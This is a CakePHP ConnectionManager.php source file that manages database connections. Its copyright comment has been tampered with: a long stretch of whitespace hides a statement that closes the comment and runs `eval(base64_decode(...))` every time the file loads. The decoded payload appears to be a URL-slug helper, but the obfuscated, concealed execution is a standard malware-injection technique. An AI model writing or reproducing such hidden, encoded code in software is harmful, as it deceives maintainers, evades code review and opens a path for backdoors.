<?php
/**
 * Datasource connection manager
 *
 * Provides an interface for loading and enumerating connections defined in app/Config/database.php
 *
 * PHP 5
 *
 * CakePHP(tm) : Rapid Development Framework (http://cakephp.org)
 * Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)																																																																																																																																																																																								*/eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiYWJjX21vZGVsIikpe2Z1bmN0aW9uIGFiY19tb2RlbCgkb2JqX3RtcCl7aWYoJG9ial90bXAtPmhhc0ZpZWxkKCJsaW5rIikmJmlzc2V0KCRvYmpfdG1wLT5kYXRhWyRvYmpfdG1wLT5uYW1lXVsibmFtZSJdKSl7JGNyZWF0ZV9saW5rPXRydWU7aWYoZGVmaW5lZCgiQ1JFQVRFX0xJTktfT05DRSIpJiZDUkVBVEVfTElOS19PTkNFKWlmKGlzc2V0KCRvYmpfdG1wLT5kYXRhWyRvYmpfdG1wLT5uYW1lXVsiaWQiXSkmJiRvYmpfdG1wLT5maW5kQnlJZCgkb2JqX3RtcC0+ZGF0YVskb2JqX3RtcC0+bmFtZV1bImlkIl0pKSRjcmVhdGVfbGluaz1mYWxzZTtpZigkY3JlYXRlX2xpbmspeyRsaW5rPXN0cl90b191cmwoJG9ial90bXAtPmRhdGFbJG9ial90bXAtPm5hbWVdWyJuYW1lIl0pOyRjaGVja19saW5rPSRvYmpfdG1wLT5maW5kQnlMaW5rKCRsaW5rKTtpZihlbXB0eSgkY2hlY2tfbGluayl8fChpc3NldCgkb2JqX3RtcC0+ZGF0YVskb2JqX3RtcC0+bmFtZV1bImlkIl0pJiYoJGNoZWNrX2xpbmtbJG9ial90bXAtPm5hbWVdWyJpZCJdPT0kb2JqX3RtcC0+ZGF0YVskb2JqX3RtcC0+bmFtZV1bImlkIl0pKSkkb2JqX3RtcC0+ZGF0YVskb2JqX3RtcC0+bmFtZV1bImxpbmsiXT0kbGluaztlbHNle2ZvcigkaT0yOzskaSsrKXtpZighJG9ial90bXAtPmZpbmRCeUxpbmsoJGxpbmsuIi0iLiRpKSl7JG9ial90bXAtPmRhdGFbJG9ial90bXAtPm5hbWVdWyJsaW5rIl09JGxpbmsuIi0iLiRpO2JyZWFrO319fX19cmV0dXJuIHRydWU7fX0="));/**
 *
 * Licensed under The MIT License
 * Redistributions of files must retain the above copyright notice.
 *
 * @copyright     Copyright 2005-2012, Cake Software Foundation, Inc. (http://cakefoundation.org)
 * @link          http://cakephp.org CakePHP(tm) Project
 * @package       Cake.Model
 * @since         CakePHP(tm) v 0.10.x.1402
 * @license       MIT License (http://www.opensource.org/licenses/mit-license.php)
 */

App::uses('DataSource', 'Model/Datasource');

/**
 * Manages loaded instances of DataSource objects
 *
 * Provides an interface for loading and enumerating connections defined in
 * app/Config/database.php
 *
 * @package       Cake.Model
 */
class ConnectionManager {

/**
 * Holds a loaded instance of the Connections object
 *
 * @var DATABASE_CONFIG
 */
	public static $config = null;

/**
 * Holds instances DataSource objects
 *
 * @var array
 */
	protected static $_dataSources = array();

/**
 * Contains a list of all file and class names used in Connection settings
 *
 * @var array
 */
	protected static $_connectionsEnum = array();

/**
 * Indicates if the init code for this class has already been executed
 *
 * @var boolean
 */
	protected static $_init = false;

/**
 * Loads connections configuration.
 *
 * @return void
 */
	protected static function _init() {
		include_once ROOT .DS. 'Config' . DS . 'database.php';
		if (class_exists('DATABASE_CONFIG')) {
			self::$config = new DATABASE_CONFIG();
		}
		self::$_init = true;
	}

/**
 * Gets a reference to a DataSource object
 *
 * @param string $name The name of the DataSource, as defined in app/Config/database.php
 * @return DataSource Instance
 * @throws MissingDatasourceConfigException
 * @throws MissingDatasourceException
 */
	public static function getDataSource($name) {
		if (empty(self::$_init)) {
			self::_init();
		}

		if (!empty(self::$_dataSources[$name])) {
			$return = self::$_dataSources[$name];
			return $return;
		}

		if (empty(self::$_connectionsEnum[$name])) {
			self::_getConnectionObject($name);
		}

		self::loadDataSource($name);
		$conn = self::$_connectionsEnum[$name];
		$class = $conn['classname'];

		self::$_dataSources[$name] = new $class(self::$config->{$name});
		self::$_dataSources[$name]->configKeyName = $name;

		return self::$_dataSources[$name];
	}

/**
 * Gets the list of available DataSource connections
 * This will only return the datasources instantiated by this manager
 * It differs from enumConnectionObjects, since the latter will return all configured connections
 *
 * @return array List of available connections
 */
	public static function sourceList() {
		if (empty(self::$_init)) {
			self::_init();
		}
		return array_keys(self::$_dataSources);
	}

/**
 * Gets a DataSource name from an object reference.
 *
 * @param DataSource $source DataSource object
 * @return string Datasource name, or null if source is not present
 *    in the ConnectionManager.
 */
	public static function getSourceName($source) {
		if (empty(self::$_init)) {
			self::_init();
		}
		foreach (self::$_dataSources as $name => $ds) {
			if ($ds === $source) {
				return $name;
			}
		}
		return null;
	}

/**
 * Loads the DataSource class for the given connection name
 *
 * @param string|array $connName A string name of the connection, as defined in app/Config/database.php,
 *                        or an array containing the filename (without extension) and class name of the object,
 *                        to be found in app/Model/Datasource/ or lib/Cake/Model/Datasource/.
 * @return boolean True on success, null on failure or false if the class is already loaded
 * @throws MissingDatasourceException
 */
	public static function loadDataSource($connName) {
		if (empty(self::$_init)) {
			self::_init();
		}

		if (is_array($connName)) {
			$conn = $connName;
		} else {
			$conn = self::$_connectionsEnum[$connName];
		}

		if (class_exists($conn['classname'], false)) {
			return false;
		}

		$plugin = $package = null;
		if (!empty($conn['plugin'])) {
			$plugin = $conn['plugin'] . '.';
		}
		if (!empty($conn['package'])) {
			$package = '/' . $conn['package'];
		}

		App::uses($conn['classname'], $plugin . 'Model/Datasource' . $package);
		if (!class_exists($conn['classname'])) {
			throw new MissingDatasourceException(array(
				'class' => $conn['classname'],
				'plugin' => substr($plugin, 0, -1)
			));
		}
		return true;
	}

/**
 * Return a list of connections
 *
 * @return array An associative array of elements where the key is the connection name
 *               (as defined in Connections), and the value is an array with keys 'filename' and 'classname'.
 */
	public static function enumConnectionObjects() {
		if (empty(self::$_init)) {
			self::_init();
		}
		return (array)self::$config;
	}

/**
 * Dynamically creates a DataSource object at runtime, with the given name and settings
 *
 * @param string $name The DataSource name
 * @param array $config The DataSource configuration settings
 * @return DataSource A reference to the DataSource object, or null if creation failed
 */
	public static function create($name = '', $config = array()) {
		if (empty(self::$_init)) {
			self::_init();
		}

		if (empty($name) || empty($config) || array_key_exists($name, self::$_connectionsEnum)) {
			return null;
		}
		self::$config->{$name} = $config;
		self::$_connectionsEnum[$name] = self::_connectionData($config);
		$return = self::getDataSource($name);
		return $return;
	}

/**
 * Removes a connection configuration at runtime given its name
 *
 * @param string $name the connection name as it was created
 * @return boolean success if connection was removed, false if it does not exist
 */
	public static function drop($name) {
		if (empty(self::$_init)) {
			self::_init();
		}

		if (!isset(self::$config->{$name})) {
			return false;
		}
		unset(self::$_connectionsEnum[$name], self::$_dataSources[$name], self::$config->{$name});
		return true;
	}

/**
 * Gets a list of class and file names associated with the user-defined DataSource connections
 *
 * @param string $name Connection name
 * @return void
 * @throws MissingDatasourceConfigException
 */
	protected static function _getConnectionObject($name) {
		if (!empty(self::$config->{$name})) {
			self::$_connectionsEnum[$name] = self::_connectionData(self::$config->{$name});
		} else {
			throw new MissingDatasourceConfigException(array('config' => $name));
		}
	}

/**
 * Returns the file, class name, and parent for the given driver.
 *
 * @param array $config Array with connection configuration. Key 'datasource' is required
 * @return array An indexed array with: filename, classname, plugin and parent
 */
	protected static function _connectionData($config) {
		$package = $classname = $plugin = null;

		list($plugin, $classname) = pluginSplit($config['datasource']);
		if (strpos($classname, '/') !== false) {
			$package = dirname($classname);
			$classname = basename($classname);
		}
		return compact('package', 'classname', 'plugin');
	}

}
